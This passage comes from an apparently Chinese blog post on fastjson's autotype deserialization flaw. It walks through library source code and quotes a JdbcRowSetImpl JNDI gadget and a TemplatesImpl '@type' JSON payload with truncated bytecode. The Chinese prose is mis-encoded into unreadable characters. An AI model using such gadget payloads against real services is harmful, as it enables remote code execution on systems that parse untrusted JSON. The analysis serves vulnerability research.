æ¯”å¦‚è¿™ä¸ª payload ä¸­çš„ <code>com.sun.rowset.JdbcRowSetImpl</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> autoCommit)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(autoCommit);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(autoCommit);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource ds = (DataSource)ctx.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? ds.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : ds.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>setAutoCommit</code> çš„æ—¶å€™ä¼š <code>ctx.lookup</code>, ä¹‹åå°±æ˜¯ JNDI æ³¨å…¥äº†, å…ˆä¸ç®¡è¿™ä¸ª, ä¸»è¦è¿˜æ˜¯äº†è§£ fastjson çš„é—®é¢˜.<br>é™¤äº†è¿™ä¸ª payload è¿˜æœ‰ä¸€ä¸ªåŸºäº <code>TemplatesImpl</code> çš„ payload, </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQExxxx"</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª payload ç›¸ä¿¡å¦‚æœçœ‹è¿‡ ysoserial å¤§æ¦‚éƒ½èƒ½çŒœå‡ºæ¥, ä¸è¿‡æ¯”è¾ƒä¸åŒçš„ä»–çš„è§¦å‘æ–¹æ³•æ¯”è¾ƒå¥‡ç‰¹, ä¸æ˜¯é€šè¿‡ setter æ¥è§¦å‘, ç›¸ä¿¡çœ‹å®Œä¸‹é¢çš„å†…å®¹å°±èƒ½ç†è§£äº†.</p><h2 id="å…¥å£"><a href="#å…¥å£" class="headerlink" title="å…¥å£"></a>å…¥å£</h2><p>ä¸€èˆ¬ç”¨åˆ°æœ€å¤šçš„åœ°æ–¹å°±æ˜¯ spring è¿™ç§ framework, fastjson æä¾›äº†å¯¹åº”çš„æ¥å£</p><p>com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">readInternal</span><span class="params">(Class&lt;? extends Object&gt; clazz, HttpInputMessage inputMessage)</span> <span class="keyword">throws</span> IOException, HttpMessageNotReadableException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> readType(getType(clazz, <span class="keyword">null</span>), inputMessage);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readType</span><span class="params">(Type type, HttpInputMessage inputMessage)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream in = inputMessage.getBody();</span><br><span class="line">        <span class="keyword">return</span> JSON.parseObject(in, fastJsonConfig.getCharset(), type, fastJsonConfig.getParserConfig(), fastJsonConfig.getParseProcess(), JSON.DEFAULT_PARSER_FEATURE, fastJsonConfig.getFeatures());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (JSONException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpMessageNotReadableException(<span class="string">"JSON parse error: "</span> + ex.getMessage(), ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpMessageNotReadableException(<span class="string">"I/O error while reading input message"</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨çš„å°±æ˜¯ <code>JSON.parseObject</code>, è¿™æ˜¯ç”¨æ¥è§£æ json objcet çš„, è¿˜æœ‰ä¸ª <code>JSON.parse</code>, è¿™ä¸ªå¯ä»¥ç”¨æ¥è§£æ <code>123</code>, <code>&quot;123&quot;</code> ä¹‹ç±»çš„ primitive.  </p><p>å®é™…ä¸Š <code>JSON.parseObject</code> æœ‰å¾ˆå¤šé‡è½½, ç»™ spring å†™çš„æ¥å£ä¸å¹³å¸¸ç”¨çš„å¹¶ä¸ä¸€æ ·. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">parseObject</span><span class="params">(InputStream is, Charset charset, Type type, ParserConfig config, ParseProcess processor, <span class="keyword">int</span> featureValues, Feature... features)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (charset == <span class="keyword">null</span>) &#123;</span><br><span class="line">        charset = IOUtils.UTF8;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] bytes = allocateBytes(<span class="number">1024</span> * <span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">int</span> readCount = is.read(bytes, offset, bytes.length - offset);</span><br><span class="line">        <span class="keyword">if</span> (readCount == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        offset += readCount;</span><br><span class="line">        <span class="keyword">if</span> (offset == bytes.length) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] newBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[bytes.length * <span class="number">3</span> / <span class="number">2</span>];</span><br><span class="line">            System.arraycopy(bytes, <span class="number">0</span>, newBytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            bytes = newBytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (T) parseObject(bytes, <span class="number">0</span>, offset, charset, type, config, processor, featureValues, features);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object obj = parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"can not cast to JSONObject."</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹³å¸¸ç”¨çš„åœ¨å†…éƒ¨å°±æ˜¯è°ƒç”¨çš„ <code>JSON.parse</code>, è€Œä¸”åé¢æœ‰ä¸ª <code>toJSON</code>, åœ¨è¿™å…¶ä¸­ä¼šåˆåºåˆ—åŒ–ä¸€éè°ƒç”¨ getter, å¦‚æœ getter é‡Œé¢æœ‰é—®é¢˜, é‚£ä¹ˆä¹Ÿä¼šå¯¼è‡´æ¼æ´. ä¸è¿‡ä¸€èˆ¬è¿˜æ˜¯ç”¨ç»™ spring çš„æ¥å£.</p><h2 id="autotype"><a href="#autotype" class="headerlink" title="autotype"></a>autotype</h2><p>autotype å°±æ˜¯æŒ‡è¿™ä¸ªååºåˆ—åŒ– java ç±»çš„åŠŸèƒ½, ä¹Ÿæ˜¯æ¼æ´çš„æºå¤´. åœ¨æ–°ç‰ˆæœ¬é‡Œå¢åŠ äº†é»‘åå•æ£€æµ‹, æ‰€ä»¥è¿™é‡Œå…ˆåˆ‡åˆ°æ—§ç‰ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">                        ref = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">'"'</span>);</span><br><span class="line">                        Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="keyword">this</span>.config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç¥å¥‡çš„æ˜¯å®ƒè¿™ä¸ª parser, åªè¦ <code>@type</code> ä¸æ˜¯è¿™ object çš„æœ€åä¸€ä¸ª key, éƒ½æ˜¯èƒ½æ­£å¸¸å·¥ä½œçš„. å¦‚æœæ˜¯æœ€åä¸€ä¸ª key, è¿”å›ä¸€ä¸ªè°ƒç”¨é»˜è®¤æ„é€ å™¨äº§ç”Ÿå¯¹è±¡, æ²¡æœ‰è®¾ç½®å„ç§å±æ€§.<br>è€Œå¦‚æœä¸æœ€åä¸€ä¸ª, ä¼šè°ƒç”¨ castToJavaBean å°†ä¹‹å‰è§£æçš„å±æ€§ç»™èµ‹å€¼è¿‡å», ç„¶å deserializer.deserialze èµ°æ­£å¸¸æµç¨‹.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, <span class="string">'"'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            map.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123; <span class="comment">// æœ€åä¸€ä¸ª key, å½“ç„¶æ¥ä¸‹æ¥å°±æ˜¯ &#125; äº†</span></span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Object instance = <span class="keyword">null</span>;</span><br><span class="line">                ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">                <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                    instance = TypeUtils.cast(object, clazz, <span class="keyword">this</span>.config);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                        instance = <span class="keyword">new</span> HashMap();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"java.util.Collections$EmptyMap"</span>.equals(typeName)) &#123;</span><br><span class="line">                        instance = Collections.emptyMap();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"java.util.Collections$UnmodifiableMap"</span>.equals(typeName)) &#123;</span><br><span class="line">                        instance = Collections.unmodifiableMap(<span class="keyword">new</span> HashMap());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        instance = clazz.newInstance();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> instance;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡æŒ‰ç…§è®¾è®¡, <code>@type</code> è‚¯å®šæ˜¯æ”¾åœ¨æœ€å‰é¢çš„. è¿™åº”è¯¥ç®— UB, ä¸åšè¿‡å¤šè®¨è®º.<br>æ­£å¸¸æƒ…å†µåº”è¯¥æ˜¯ deserializer.deserialze. å¯¹äºæ™®é€š Bean, åˆ›å»º deserialzer æ˜¯åœ¨ <code>com.alibaba.fastjson.parser.ParserConfig</code> çš„ <code>this.createJavaBeanDeserializer</code>, å–å¾— setter æ˜¯åœ¨ <code>JavaBeanInfo.build</code>. åˆ¤æ–­ setter çš„æ–¹æ³•å¦‚ä¸‹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">"set"</span>)) &#123;</span><br><span class="line">   <span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line">   String propertyName;</span><br><span class="line">   <span class="keyword">if</span> (!Character.isUpperCase(c3) &amp;&amp; c3 &lt;= <span class="number">512</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (c3 == <span class="string">'_'</span>) &#123;</span><br><span class="line">           propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">'f'</span>) &#123;</span><br><span class="line">           propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (methodName.length() &lt; <span class="number">5</span> || !Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">       propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾, é€‚é…äº†å¸¸è§çš„ä¸¤ç§å‘½åæ–¹å¼, set_xxx å’Œ setXxx, ä¸‹åˆ’çº¿å’Œé©¼å³°, è¿˜æœ‰ä¸€ä¸ª fxxx å‘½åæ–¹å¼æ²¡è§è¿‡, å¯èƒ½æ˜¯é˜¿é‡Œå†…éƒ¨ç”¨çš„å¤šå§ (é€ƒ  </p><p>ä½†æ˜¯é™¤äº†è¿™ç§ setter, å®é™…ä¸Šè¿˜ä¼šè°ƒç”¨ä¸€äº› getter, å…ˆçœ‹ç›¸å…³ä»£ç   </p><p>com.alibaba.fastjson.util.JavaBeanInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var30 = clazz.getMethods();</span><br><span class="line">var29 = var30.length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; var29; ++i) &#123;</span><br><span class="line">    method = var30[i];</span><br><span class="line">    String methodName = method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">"get"</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">        JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">        <span class="keyword">if</span> (annotation == <span class="keyword">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">            String propertyName;</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="keyword">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                propertyName = annotation.name();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆ¤æ–­äº†ä¸€ä¸‹å¼€å¤´ä¸º get, ä¸”ç¬¬å››ä½ä¸ºå¤§å†™, é‡ç‚¹æ˜¯åé¢æ£€æµ‹äº†è¿”å›å€¼, å¿…é¡»ç»§æ‰¿ Map, Collection æˆ–è€…æ˜¯ AtomicXxxx. è¿™äº›æ˜¯å¹²å˜›çš„å‘¢?<br>å¯ä»¥çœ‹ä¸€ä¸‹å…·ä½“è¿™äº›æ–¹æ³•ä¼šè¢«æ€ä¹ˆè°ƒç”¨å°±çŸ¥é“äº†  </p><p>com.alibaba.fastjson.parser.deserializer.FieldDeserializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object object, Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value != <span class="keyword">null</span> || !<span class="keyword">this</span>.fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = <span class="keyword">this</span>.fieldInfo.method;</span><br><span class="line">            <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123; <span class="comment">// ä¼˜å…ˆè°ƒç”¨ method, ä¸‹é¢æ˜¯ç›´æ¥å¤åˆ¶ç»™ field, ä¸è¿™é‡Œç±»ä¼¼, ä¸å¤åˆ¶äº†</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.getOnly) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                        AtomicInteger atomic = (AtomicInteger)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicInteger)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                        AtomicLong atomic = (AtomicLong)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicLong)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                        AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicBoolean)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                        Map map = (Map)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            map.putAll((Map)value);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        Collection collection = (Collection)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (collection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            collection.addAll((Collection)value);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    method.invoke(object, value);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯è°ƒç”¨äº† getter, ç„¶åèµ‹å€¼ç»™è¿™äº›å¯¹è±¡, ç›¸ä¿¡ç°åœ¨å°±èƒ½æ˜ç™½è¿™äº›æ˜¯å¹²å˜›çš„äº†, å¦‚æœæœ‰ä¸€ä¸ªå¯¹è±¡, é‡Œé¢æœ‰ä¸€ä¸ªå±æ€§æ˜¯ <code>HashMap test</code>, ä¸”æœ‰ä¸€ä¸ª <code>public HashMap getTest()</code> æ–¹æ³•, é‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶, <code>{&quot;@type&quot;: &quot;xxx.xxx&quot;, &quot;test&quot;: {&quot;aa&quot;: &quot;sss&quot;}}</code>, key =&gt; aa, value =&gt; sss å°†ä¼šè¢«åŠ åˆ° test é‡Œé¢å», è¿™ç®—ä¸€ä¸ªå° feature å§, æ–¹ä¾¿å¼€å‘. ä½†æ˜¯ç¡®å®æœ‰ç‚¹åç›´è§‰.  </p><p>è¿™é‡Œé¡ºä¾¿çœ‹ä¸€ä¸‹æ­£è§„ååºåˆ— (toJSON, toJSONString) æ—¶ä½¿ç”¨çš„ getter æ˜¯æ€ä¹ˆåˆ¤æ–­çš„, åœ¨ <code>com.alibaba.fastjson.util.TypeUtils</code> çš„ <code>buildBeanInfo</code>, é‡Œé¢è°ƒç”¨äº† <code>computeGetters</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(methodName.startsWith(<span class="string">"get"</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(methodName.length() &lt; <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(methodName.equals(<span class="string">"getClass"</span>))&#123;</span><br><span class="line">        <span 